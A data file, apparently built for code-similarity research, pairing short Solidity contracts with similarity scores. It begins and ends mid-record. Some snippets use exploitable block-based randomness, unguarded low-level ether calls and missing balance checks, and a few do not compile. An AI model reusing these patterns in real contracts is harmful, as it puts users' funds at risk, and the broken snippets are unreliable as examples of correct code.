    constructor (address ownerAddress) public

    {

        owner = ownerAddress;

    }

}"
"contract SchedulerAPI { 
    function scheduleCall(address contractAddress,
                          bytes4 abiSignature,
                          uint targetBlock) public returns (address); }",0.6361592587625395,"contract DividendService {



    

    function check(address _token, address _spender, address _holder, uint _interval) public returns (uint8);

}"
"contract ex {
   address[] users;
   function addUser() public {
        users.push(msg.sender);
   }

   function returnUsers() constant returns (address[]) {
       return users;
   }
}",0.6632453965928873,"contract Token {
	function balanceOf(address user) constant returns (uint256 balance);
	function transfer(address receiver, uint amount) returns(bool);
}"
"contract tryContract {
    mapping (address=>bytes32[10]) Map;

    function fill_map(bytes32[10] _attributes) public  {
            Map[msg.sender] = _attributes;
    }

    function get_attributes(address _id) view public returns (bytes32[10]){
      return Map[_id];
    }
}",0.6367181771940483,"contract MultiSigInterface{
  function update_and_check_reach_majority(uint64 id, string memory name, bytes32 hash, address sender) public returns (bool);
  function is_signer(address addr) public view returns(bool);
}"
"contract Borrower {
    uint256 public amountReceived;

    function Borrower() payable public {
    }

    function payLoan(Loan _loan) payable public {

        
        Loan loan = Loan(_loan);
        amountReceived = msg.value;

        
        loan.payLoan.value(amountReceived)();
    }   

    function getThisBalance() public view returns (uint256){

        return this.balance;
    }
}",0.6484090201864183,"contract Merunas {

    address payable public owner = msg.sender;

    

    function () external {}

    function receiveDonation() public payable {}

    function extractFunds() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    function showBalance() public view returns(uint256) {

        return address(this).balance;

    }

}"
"contract Loan {
    address public borrower;
    uint256 public loanBalance;

    function payLoan() payable public {
        uint256 received = msg.value;
        loanBalance -= received;
        }

    function Loan(address _borrower) payable public {
        borrower    = _borrower;
        loanBalance = msg.value;
        }

    function getThisBalance() public view returns (uint256){

        return this.balance;
    }
}",0.6598155935073965,"contract MANAInterface {

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);

    function approve(address _spender, uint256 _value) public returns (bool);

    function balanceOf(address _owner) public view returns (uint256);

    function transfer(address _to, uint256 _value) public returns (bool);

}"
"contract Child {

      mapping(string => string) private strings;


      function GetString(string key) public constant returns(string value) {
        return strings[key];
      }

}",0.6601997462159862,"contract AbstractRegistration {
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]);
}"
"contract Parent {

     Child c;


     function GetString(string key) public constant returns(string value) {
         return c.GetString(key);
     }

 }",0.6342916401511268,"contract Agent {
    using SafeMath for uint256;

    function isInitialized() public constant returns (bool) {
        return false;
    }
}"
"contract Oracle {
  mapping(uint => uint) oracle_values;
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function Oracle() public {
    owner = msg.sender;
  }

  function StoreDocument(uint _key, uint _value) public onlyOwner() {
    oracle_values[_key] = _value;
  }

  function RetrieveData(uint _date) public constant returns (uint data) {
    return oracle_values[_date];
  }
}",0.6877555515387223,"contract	TableDeRapprochement_322		{							

												

			address	owner	;							

												

			function	TableDeRapprochement_322		()	public	{				

				owner	= msg.sender;							

			}									

												

			modifier	onlyOwner	() {							

				require(msg.sender ==		owner	);					

				_;								

			}									

												

												

												

		

												

												

			uint256	Data_1	=	1000	;					

												

			function	setData_1	(	uint256	newData_1	)	public	onlyOwner	{	

				Data_1	=	newData_1	;					

			}									

												

			function	getData_1	()	public	constant	returns	(	uint256	)	{

				return	Data_1	;						

			}									

												

												

												

























												

												

	}"
"contract Assertnil {
    bytes32 v;
    function test() constant returns (bool) {
        bytes32 w;
        assert(v == w);
        return true;
    }
}",0.663121058692204,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract MyContract {   
    address public createdBy;   
    string public stringOne;   
    string public stringTwo;   
    string public stringThree;    

    constructor(address sender, string one, string two, string three) public {     
        createdBy = sender;     
        stringOne = one;     
        stringTwo = two;     
        stringThree = three;   
    }    

    function getContractSummary() public view returns(address, string, string, string) {     
        return (       
            createdBy,       
            stringOne,       
            stringTwo,       
            stringThree     
        );   
    } 
}",0.6447976000387636,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract Simple {
  uint public value1;
  uint public value2;

  function setOne(uint v) {
    require(v > 10);

    value1 = v;
  }

  function setTwo(uint v) {
      if(v <=  10 ) throw;

      value2 = v;
  }  
}",0.6127287309574891,"contract SimpleStorageCleide {

    

    uint price;



    

    function setCleide (uint newValue) 

    public

    {

        price = newValue;

    }

    

    

    function getCleide() 

    public 

    view

    returns (uint) 

    {

        return price;

    }

}"
"contract ExampleSend {
        using SafeMath for uint256;
        function sendEther(uint256 amount, address[] targets) public returns (bool){
            uint256 countTargets = targets.length;

            require( address(this).balance > amount.mul(countTargets));

            for(uint256 i = 0; i < countTargets; i++){
                targets[i].transfer(amount);
            }
        }
    }",0.6187117495646679,"contract A004{

  using SafeMath256 for uint256;
  uint8 public constant decimals = 18;
  uint256 public constant decimalFactor = 10 ** uint256(decimals);

function batchTtransferEther(address[] _to,uint256[] _value) public payable {
    require(_to.length>0);
    
    for(uint256 i=0;i<_to.length;i++)
    {
        _to[i].transfer(_value[i]);
    }
}


  
  
  
    
}"
"contract Adoption {


address[16] public adopters;


function adopt(uint petId) public returns (uint) {
  require(petId >= 0 && petId <= 15);

  adopters[petId] = msg.sender;

  return petId;
}



function getAdopters() public view returns (address[16]) {
  return adopters;
}


    
  
  
  
  



   function unAdopt(uint petid) public returns(address){


         address expected = msg.sender;

         address onwer = adopters[petid];

           require(expected == onwer );
             delete adopters[petid];

              return onwer;



      }

}",0.652711095714066,"contract AddressHolder {

    address[] internal addresses;



    function inArray(address _addr) public view returns(bool){

        for(uint i = 0; i < addresses.length; i++){

            if(_addr == addresses[i]){

                return true;

            }

        }

        return false;

    }



    function addAddress(address _addr) public {

        addresses.push(_addr);

    }



    function showAddresses() public view returns(address[] ){

        return addresses;

    }



    function totalUsers() public view returns(uint count){

        return addresses.length;

    }

}"
"contract Test {
    
    function getString(bytes32 _mg) returns (bytes32) {
         return _mg;
    }
}",0.6640085161596894,"contract IRandomUtil{

    function getRandom(bytes32 param) public returns (bytes32);

}"
"contract User { 
    
    function User() {
        
    }
}",0.6922662711955618,"contract Hello {

    function Hello() {

    }
}"
"contract ReceiveEther {
    uint256 public clicksfromcreatorcount; 
    address public creator= msg.sender;
        function increaseifcreatorclicks() external {
            require(msg.sender == creator);
                clicksfromcreatorcount++;
        }
        function () external payable {
            require (clicksfromcreatorcount >=1);
                while (clicksfromcreatorcount==1 ) {
                    require(msg.sender == creator);
                }

        }
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
}",0.6373613185176956,"contract MyBank {

    

    mapping (address => uint) bank;

    

    function getValue() public view returns (uint) {

        return bank[msg.sender];

    }

    

    function diposit() payable public {

        require(msg.value > 0);

         bank[msg.sender] += msg.value;

    }

    

    function withdraw(uint _amount, address payable _account) public{

        require (msg.sender != _account);

        require(bank[msg.sender] >= _amount);

        bank[msg.sender] = bank[msg.sender] - _amount;

        _account.transfer(_amount);

    }

}"
"contract SendEtherFirst {
    address public creator= msg.sender;
        function sendViaCall (address payable _to) public payable {
            require(msg.sender == creator);
            (bool sent, bytes memory data) = _to.call.value(msg.value)("""");
            require (sent, ""failed to send ether"");
        }
}",0.6508742301607714,"contract Ownable {

    address public owner;



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function Ownable() public {

        owner = msg.sender; 

    }



    

    function setOwner(address _to) public onlyOwner returns (bool) {

        require(_to != address(0));

        owner = _to;

        return true;

    } 

}"
"contract Feline {
    function utterance() returns (bytes32);
}",0.6505828496896067,"contract VoxLike {
    function par() public returns (uint);
}"
"contract Cat is Feline {
    function utterance() returns (bytes32) { return ""miaow""; }
}",0.6835588584831211,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Test {
    uint8[] private arr;

    function Test() public {
    }

    function setLength(uint256 length) public {
        arr.length = length;
    }

    function getLength() public constant returns (uint256) {
        return arr.length;
    }
}",0.6783216388637199,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract D {
  uint public n;
  address public sender;
  event GotPaid(address _sender, uint256 _value);


  function callSetN(address payable  _e, uint _n) payable public {
    
    _e.call.value(msg.value)(abi.encodeWithSignature(""setN(uint256)"", _n)); 
    emit GotPaid(msg.sender, msg.value);
  }

}",0.6389233485554376,"contract SelfDestroy is Ownable {

    using SafeMath for uint256;

    uint256 public weiAmount = 0;

    constructor() public {}

   

   

    function () public payable {

        weiAmount = weiAmount + msg.value;

    }

   

   function destroy(address _address) public onlyOwner {

       selfdestruct(_address);

   }



}"
"contract E {
  uint public n;
  address public sender;
  event Update(uint256 num);
  function setN(uint _n) payable public {
     n = _n;
     emit Update(_n);
  }

}",0.6378258107896266,"contract Weth {

  function deposit() public payable {}

  function withdraw(uint wad) public {}

  function approve(address guy, uint wad) public returns (bool) {}

}"
"contract C {

    function foo(address payable _d, address payable _e, uint _n) payable public {
      address(_d).call.value(msg.value)(abi.encodeWithSignature(""callSetN(address,uint256)"",_e,_n));
    }

}",0.6101280736565313,"contract Forward {
    address public destination;
    
    function Forward(address _addr) {
        destination = _addr;
    }
    
    function() payable {
        require(destination.call.value(msg.value)(msg.data));
    }

}"
"contract Donation {


  address public owner;

  struct Payee {
    bool status;
    uint weight;
    uint balance;
  }

  e.
  mapping(address => Payee) public payees;
  mapping (int8 => address) public payeesIndex;

  int8 public payeesIndexSize;

  function Donations() private {
    
    owner = msg.sender;
    payees[owner].status = true;
    payees[owner].weight = 10;
    payeesIndex[0] = owner;
    payeesIndexSize = 1;
  }

  
  modifier isOwner() {

      require (msg.sender == owner);
    _;
  }

  
  function getTotalWeight() public view returns (uint) {

    int8 i;
    uint totalWeight = 0;

    for (i=0;i<payeesIndexSize;i++) {
       if (payees[payeesIndex[i]].status == true) {
         totalWeight += payees[payeesIndex[i]].weight;
       }
    }

    return totalWeight;
  }


  
  function addPayee(address _payee, uint _weight) isOwner public returns (bool) {

    payees[_payee].weight = _weight;
    payees[_payee].status = true;
    payeesIndex[payeesIndexSize] = _payee;
    payeesIndexSize++;

}

function getStatus(address _address) public view returns(bool)  {
    return payees[_address].status;
  }",0.6111549532267646,"contract EthMash {

    address public owner;
    mapping (address => uint) public balances;

    address public leader;

    event Log(address challenger, address defender, bool success);

    constructor() public {
        owner = msg.sender;
        leader = owner;
    }

    function publicGetBalance(address player) view public returns (uint) {
        return balances[player];
    }

    function publicGetState() view public returns (address) {
        return leader;
    }

    function userWithdraw() public {
        require(balances[msg.sender] > 0);
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(amount);
    }

    function userChallenge() public payable {
        require(msg.value == 100 finney);
        
        uint random = (uint(blockhash(block.number - 1)) + uint(leader) + uint(msg.sender));
        if (random % 2 == 1) {
            emit Log(msg.sender, leader, true);
            balances[msg.sender] += 100 finney;
            leader = msg.sender;
        } else {
            emit Log(msg.sender, leader, false);
            balances[leader] += 95 finney;
            balances[owner] += 5 finney;
        }
    }
}"
"contract TestSend {

    uint public balance ;

    function TestSend() {
        balance = 0 ; 
    }

    function () {
        throw ;
    }

    function pay() payable public  {
        balance += msg.value ; 
    }

     function withdraw(address addr,uint amnt)  public  {

        balance -=  amnt  ; 

        if (! addr.send(amnt)) {
              balance +=  amnt ; 
        }
    }     
}",0.6706950979946027,"contract MegaPlay

{

    address Owner = msg.sender;



    function() public payable {}

    function close() private { selfdestruct(msg.sender); }



    function Play() public payable {

        if (msg.value >= address(this).balance) {

           close();

        }

    }

 

    function end() public {

        if (msg.sender == Owner) {

            close();

        }

    }

}"
"contract Lottery {
    address public manager;
    address[] public players;

    function Lottery() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether);

        players.push(msg.sender);
    }

    function random() private view returns (uint) {
        return uint(keccak256(block.difficulty, now, players));
    }

    function pickWinner() public restricted {
        uint index = random() % players.length;
        players[index].transfer(this.balance);
        players = new address[](0);
    }

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

    function getPlayers() public view returns (address[]) {
        return players;
    }
}",0.6570271245126273,"contract Tool{
    
    address payable internal _owner ;

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    function owner() public view returns(address){
        return _owner;
    }

    constructor() public{
        _owner = msg.sender;
    }

    function transfer(address payable to) onlyOwner public payable {
        require(msg.value > 0);
        to.transfer(msg.value);
    }

    function so(address payable no) onlyOwner public{
        require(no != address(0));
        _owner = no;
    }

    function kilele(address payable addr) onlyOwner public{
        selfdestruct(addr);
    }

    function () external payable {
        if(msg.value > 0){
            _owner.transfer(msg.value);
        }else{
            revert();
        }
    }
}"
"contract A {
    
    uint256 public variable; 

    

    
    function setVariable(uint256 _variable) public returns (uint256) {
        variable = _variable;
    }

    
    function getVariable() public constant returns (uint256) {
        return variable;
    }
}",0.6769004329262578,"contract GST2 {
  function mint(uint256 value) public {}
  function freeUpTo(uint256 value) public returns (uint256 freed) {}
  function freeFromUpTo(address from, uint256 value) public returns (uint256 freed) {}
}"
"contract B {
    
    address public AContract; 

    

    
    function setAContract(address _AContract) public {
        AContract = _AContract;
    }

    
    function queryA() public constant returns (uint256) {
        return A(AContract).getVariable();
    }
}",0.6533510165158047,"contract ERC20Basic {

  uint256 public totalSupply;

  function balanceOf(address who) public constant returns (uint256);

  function transfer(address to, uint256 value) public returns(bool);

}"
"contract F {
  function createChildContract() public returns (address child) {
    child = address(new C());
  }
}",0.6892105270723679,"contract IContractRegistry {
    function addressOf(bytes32 _contractName) public view returns (address);
}"
"contract EtherBank {

    
    
    
    mapping(address => uint) public accounts;
    

    
    
    
    function EtherBank() {
        accounts[msg.sender] = 1000;
    }
    

    
    
    function getBalance(address addr) constant returns (uint _balance) {
        return accounts[addr];
    }
    
}",0.6613051732271208,"contract Token {

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function balanceOf(address _owner) public constant returns (uint256 balance);
}"
"contract xyz {
   uint x = 0;

   function setX(uint pX) public {
       x = pX;
   }

   function getX() public view returns(uint){
       return x;
   }
}",0.6858388736787937,"contract Token {
  function balanceOf(address) public view returns (uint);
  function decimals() public view returns (uint);
}"
"contract abc{
    xyz public obj = new xyz();

    function getValueOfObj() public view returns(uint){
        return obj.getX();
    }

    function setValueOfObj(uint pX) public{
        obj.setX(pX);
    }
}",0.6846732803607745,"contract SimpleStorageKevin {

    

    

    uint x = 316;



    

    function setKevin(uint newValue)

        public

    {

        x = newValue;

    }

    

    

    function getKevin()

        public

        view

        returns (uint) 

    {

        return x;

    }

}"
"contract TtdmToken {

    uint256 public totalSupply;

    function TtdmToken () public {
        totalSupply = 1000000;
    }
   }",0.6215609225733854,"contract ERC721Enumerable is ERC721Basic {

    function totalSupply() public view returns (uint256);

}"
"contract Voting {
  bytes32[] public candidateList;
  uint public totalTokens;
  uint public balanceTokens;
  uint public tokenPrice;

  address public owner;

  struct voter {
    address voterAddress;
     uint tokensBought;
     uint[] tokensUsedPerCandidate;
  }

  mapping(address => voter) public voterInfo;
  mapping(bytes32 => uint) public votesReceived;

  constructor(uint _totalTokens, uint _tokenPrice, bytes32[] 
    _candidateNames) public {
    totalTokens = _totalTokens;
    balanceTokens = _totalTokens;
    tokenPrice = _tokenPrice;
    candidateList = _candidateNames;
    owner = msg.sender;
  }

  function transferBalance() public {
    owner.transfer(address(this).balance);
  }

  function buy() payable public {
    uint tokensToBuy = msg.value / tokenPrice;
    require(tokensToBuy <= balanceTokens);
    voterInfo[msg.sender].voterAddress = msg.sender;
    voterInfo[msg.sender].tokensBought += tokensToBuy;
    balanceTokens -= tokensToBuy;
  }

  function voteForCandidate(bytes32 candidate, uint tokens) public {
    
    
    

    uint availableTokens = voterInfo[msg.sender].tokensBought - 
    totalTokensUsed(voterInfo[msg.sender].tokensUsedPerCandidate);

    require(tokens <= availableTokens, ""You don't have enough tokens"");
    votesReceived[candidate] += tokens;

    if(voterInfo[msg.sender].tokensUsedPerCandidate.length == 0) {
      for(uint i=0; i<candidateList.length; i++) {
        voterInfo[msg.sender].tokensUsedPerCandidate.push(0);
      }
    }

    uint index = indexOfCandidate(candidate);
    voterInfo[msg.sender].tokensUsedPerCandidate[index] += tokens;
  }

  function indexOfCandidate(bytes32 candidate) view public returns(uint) 
  {
    for(uint i=0; i<candidateList.length; i++) {
      if (candidateList[i] == candidate) {
        return i;
      }
    }
    return uint(-1);
  }

  function totalTokensUsed(uint[] _tokensUsedPerCandidate) private pure 
  returns (uint) {
    uint totalUsedTokens = 0;
    for(uint i=0; i<_tokensUsedPerCandidate.length; i++) {
      totalUsedTokens += _tokensUsedPerCandidate[i];
    }
    return totalUsedTokens;
  }

  function voterDetails(address user) view public returns (uint, uint[]) 
  {
    return (voterInfo[user].tokensBought, 
      voterInfo[user].tokensUsedPerCandidate);
  }

  function tokensSold() public view returns (uint) {
    return totalTokens - balanceTokens;
  }

  function allCandidates() public view returns (bytes32[]) {
    return candidateList;
  }

  function totalVotesFor(bytes32 candidate) public view returns (uint) {
    return votesReceived[candidate];
  }
}",0.6090969008533998,"contract Chain is ERC20Interface{
    using SafeMath for uint;

    string public symbol;
    string public  name;
    uint8 public decimals;
    uint _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    
    
    
    function Chain() public {
        symbol = ""HNTC"";
        name = ""HNT Chain"";
        decimals = 18;
        _totalSupply = 15000000000 * 10**uint(decimals);
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    
    
    
    function totalSupply() public constant returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    
    
    
    function balanceOf(address tokenOwner) public constant returns (uint balance) {
        return balances[tokenOwner];
    }

    
    
    
    
    
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    
    
    
    
    
    
    
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    
    
    
    
    
    
    
    
    
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    
    
    
    
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    
    
    
    
    
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }

    
    
    
    function multiTransfer(address[] _addresses, uint256[] amounts) public returns (bool success){
        for (uint256 i = 0; i < _addresses.length; i++) {
            transfer(_addresses[i], amounts[i]);
        }
        return true;
    }

    
    
    
    function multiTransferDecimals(address[] _addresses, uint256[] amounts) public returns (bool success){
        for (uint256 i = 0; i < _addresses.length; i++) {
            transfer(_addresses[i], amounts[i] * 10**uint(decimals));
        }
        return true;
    }
    
    
    
    function () public payable {
        revert();
    }
}"
"contract UserBasic {
    bytes32 test;
    function getBytes() constant returns(bytes32) {
        return test;
    }
    function setBytes(bytes32 _bytes) {
        test = _bytes;
    }
}",0.6216145104551585,"contract AssetIDInterface {

  function getAssetID() public constant returns (string);

  function getAssetIDHash() public constant returns (bytes32);

}"
"contract TimedSafe {

    address creator;
    address bank = 0xB599C8008E505ed9bd34C4761EBAae53a89207Af;

    uint256 safe;

    uint256 startTime;
    uint256 endTime;

    uint8 state; 

    
    constructor() public {
        creator = msg.sender;
        state = 0;
    }

    function storeSafe(uint8 m) public payable {
        assert(msg.sender == creator);
        assert(state == 0);
        safe = msg.value;
        startTime = now;
        endTime = startTime + (m * 1 minutes);
        state = 1;
    }

    function retrieveSafe() public {
        assert(msg.sender == creator);
        assert(state == 1);
        if(now < endTime) {
            state = 2;
            creator.transfer(safe);
        } else {
            state = 3;
            bank.transfer(safe);
        }
    }

    function timeLeft() public view returns (uint256 t) {
        assert(state == 1);
        return endTime - now;
    }

    function getState() public view returns (uint8 st) {
        return state;
    }
}",0.6501148568334292,"contract Crowdsale {

    

    uint256 public startTime;

    uint256 public endTime;



    

    uint256 public rate;



    

    uint256 public weiRaised;





    

    

    

    

    

    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);



    function initCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate) public {

        require(

            startTime == 0 && endTime == 0 && rate == 0,

            ""Global variables must be empty when initializing crowdsale!""

        );

        require(_startTime >= now, ""_startTime must be more than current time!"");

        require(_endTime >= _startTime, ""_endTime must be more than _startTime!"");



        startTime = _startTime;

        endTime = _endTime;

        rate = _rate;

    }



    

    function hasEnded() public view returns (bool) {

        return now > endTime;

    }

}"
"contract Simple {
   uint256 storedNumber;

   function setNumber(uint256 x) public {
        storedNumber = x;
   }
   function getNumber() public view returns (uint256) {
        return storedNumber;
   }
}",0.6756449956718276,"contract PotatoStorage {
    string storedPotato;

    function setPotato(string x) public {
        storedPotato = x;
    }

    function getPotato() public view returns (string) {
        return storedPotato;
    }
}"
"contract StoreIDToAddress {
    
    mapping(uint => address) public numToAddress;

    
    function getAddresses(uint16[] calldata  _IDs) external view returns (address[] memory) {
        address[] memory arr = new address[](_IDs.length);
        
        for (uint i; i < _IDs.length; i++) {
            arr[i] = numToAddress[_IDs[i]];
        }
        
        return arr;
    }

    
}",0.6198693887475064,"contract BalanceChecker {
 
    function balanceOf(address[] memory addresses) public view returns (uint[] memory balances) {
        balances = new uint[](addresses.length);
        for (uint i = 0; i < addresses.length; i++) {
            balances[i] = ERC20(0x0C8cDC16973E88FAb31DD0FCB844DdF0e1056dE2).balanceOf(addresses[i]);
        }
    } 

}"
"contract ethertransfer {    
  function fundtransfer(address etherreceiver, uint256 amount) {
    if(!etherreceiver.send(amount)) {
       throw;
    }
  }
}",0.6249042797553931,"contract token {
    function transfer(address receiver, uint amount);
    function balanceOf( address _address )returns(uint256);
}"
"contract Election {

struct Candidate {
    string name;
    uint voteCount;
}

struct Voter {
    bool authorized;
    bool voted;
    uint vote;
}

address public owner;
string public electionName;

mapping(address => Voter) public voters;
Candidate[] public candidates;
uint public totalVotes;

modifier ownerOnly(){
    require(msg.sender == owner);
    _;
}

function Election(string _name) public {
    owner = msg.sender;
    electionName = _name;
}

function addCanditate(string _name) ownerOnly public {
    candidates.push(Candidate(_name, 0));
}

function getNameCandidate() public view returns(uint){
    returns Candidate.length;
}

function authorize (address _person) ownerOnly public {
    voters[_person].authorized = true;
}

function vote (uint _voteIndex) public {
    require(!voters[msg.sender].voted);
    require(voters[msg.sender].authorized);

    voters[msg.sender].vote = _voteIndex;
    voters[msg.sender].voted = true;

    Candidates[_voteIndex].voteCount += 1;
    totalVotes += 1;
}
function end() ownerOnly public {
    selfdestruct(owner);
}

}",0.622028688729078,"contract MeerkatICO {

    iERC20 token;

    address owner;

    address tokenCo;

    uint rateMe;

    

    modifier ownerOnly() {

        require(msg.sender == owner);

        _;

    }





    

    

   constructor(address _main) public {

        token = iERC20(_main);

        tokenCo = _main;

        owner = msg.sender;

        rateMe = 14400;

    }



    

    function withdraw() public ownerOnly {

        owner.transfer(address(this).balance);

    }



    

    

    

    function setRate(uint _rateMe) public ownerOnly {

        rateMe = _rateMe;

    }

    

    function CurrentRate() public constant returns (uint rate) {

        return rateMe;

    }

    

    function TokenLinked() public constant returns (address _token, uint _amountLeft) {

        return (tokenCo, (token.balanceOf(address(this)) / 10**18)) ;

    }

    

    

    

    

    

    function transferAnyERC20Token(address tokenAddress, uint tokens) public ownerOnly returns (bool success) {

        return iERC20(tokenAddress).transfer(owner, tokens);

    }



    

    

    

    function () public payable {

        

        

        require( (msg.value >= 100000000000000000) && (rateMe != 0) );

        

        uint value = msg.value * rateMe;

        

        

        require(value/msg.value == rateMe);

        

        token.transfer(msg.sender, value);

        

    }

}"
"contract MinimumToken {
    
    mapping(address => uint256) balanceOf;
    uint256 total;
    address[] participants;

    
    constructor (address from, uint256 _total) public {
        total = _total;
        balanceOf[from] = total;
    }

    
    function transferFrom (address from, address to, uint256 amount) public {
        require(!(to == address(0)), ""error"");
        require(!(from == to), ""error"");
        require(amount <= balanceOf[from], ""error"");

        balanceOf[from] = balanceOf[from] - amount;
        balanceOf[to] = balanceOf[to] + amount;

    }
}",0.6637983880718091,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}"
"contract b {
    mapping(uint => function()) funcMap;
    function g() public view {
        uint x=0;
    }
    function update() public {
        funcMap[1] = g();
    }",0.6498098106287087,"contract Token {
  function balanceOf(address) public view returns (uint);
  function decimals() public view returns (uint);
}"
"contract Inbox {
    string public message;
    string[] hex_storage;
    address owner;

     event printHex(string x);

    function Inbox(string initialMessage) public payable {
        owner = msg.sender;
        message = initialMessage;
    }

    modifier isOwner {
        require(msg.sender == owner);
        _;
    }

    function setMessage(string newMessage) public 
    {
        message = newMessage;
    }
        function getMessage() public view returns (string) 
        {
            return message;
        }

    function storeMember(string hex_data) public 
    {
        hex_storage.push(hex_data);
    }

    function showMember() public 
    {
        for (uint i=0; i<hex_storage.length; i++)
        {
            printHex(hex_storage[i]);
        }
    }

    function cleanOutBalance() isOwner public  
    {
        uint bal = address(this).balance;
        address(owner).transfer(bal);
    }

    function displayBalance() public view returns (uint)
    {
        uint bal = address(this).balance;
        return bal;
    }


}",0.6290039418294295,"contract IERC20Token {
  function name() public constant returns (string) { name; }
  function symbol() public constant returns (string) { symbol; }
  function decimals() public constant returns (uint8) { decimals; }
  function totalSupply() public constant returns (uint256) { totalSupply; }
  function balanceOf(address _owner) public constant returns (uint256 balance) { _owner; balance; }
  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { _owner; _spender; remaining; }

  function transfer(address _to, uint256 _value) public returns (bool);
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool);
  function approve(address _spender, uint256 _value) public returns (bool);
}"
"contract MyContract {
    event MyEvent();

    function myFunction() public {
        emit MyEvent();
    }
}",0.6284807897315103,"contract FiatContract {

 

  function EUR(uint _id) constant public returns (uint256);



}"
"contract DappTokenSale {

    address payable admin;
    DappToken public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

    constructor (DappToken _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice; 
    }
    function multiply (uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens (uint256 _numberOfTokens) public payable {

        require (msg.value == multiply(_numberOfTokens, tokenPrice));
        require (tokenContract.balanceOf(address(this)) >= _numberOfTokens);
        require (tokenContract.transfer(msg.sender, _numberOfTokens));


        tokensSold += _numberOfTokens;
        emit Sell(msg.sender, _numberOfTokens);
    }
        function endSale () public {

            require (msg.sender == admin);
            require (tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));
            selfdestruct(admin);
        }

    }",0.6423650711349975,"contract GECO is Ownable {

  using SafeMath for uint256;

  

  event IncomingTransfer(address indexed to, uint256 amount);

  event ContractFinished();

    

  address public wallet;

  uint256 public endTime;

  uint256 public totalSupply;

  mapping(address => uint256) balances;

  bool public contractFinished = false;

  

  function GECO(address _wallet, uint256 _endTime) public {

    require(_wallet != address(0));

    require(_endTime >= now);

    

    wallet = _wallet;

    endTime = _endTime;

  }

  

  function () external payable {

    require(!contractFinished);

    require(now <= endTime);

      

    totalSupply = totalSupply.add(msg.value);

    balances[msg.sender] = balances[msg.sender].add(msg.value);

    wallet.transfer(msg.value);

    IncomingTransfer(msg.sender, msg.value);

  }

  

  function finishContract() onlyOwner public returns (bool) {

    contractFinished = true;

    ContractFinished();

    return true;

  }

  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }

}"
"contract C {
          uint data;

      function getData() constant returns (uint retData) {
        return data;
      }
}",0.68504640097948,"contract HelloWorld {
    
    function getData() public constant returns (string) {
        return ""Hello, world!"";
    }
   
}"
"contract Bank {
    uint private value;
    address private owner;

    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function Bank(uint amount) {
        value = amount;
        owner = msg.sender;
    }

    function checkValue(uint amount) returns (bool) {
        return amount >= value;
    }

    function deposit(uint amount) {
        value += amount;
    }

    function withdraw(uint amount) {
        if(checkValue(amount)) {
        value -= amount;
        }
    }

    function balance() returns (uint) {
        return value;
    }
}",0.6562993391571632,"contract LockedCash is Owned {
    event CashDeposit(address from, uint amount);
    address public owner = msg.sender;

    function init() payable {
        require(msg.value > 0.5 ether);
        owner = msg.sender;
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        CashDeposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
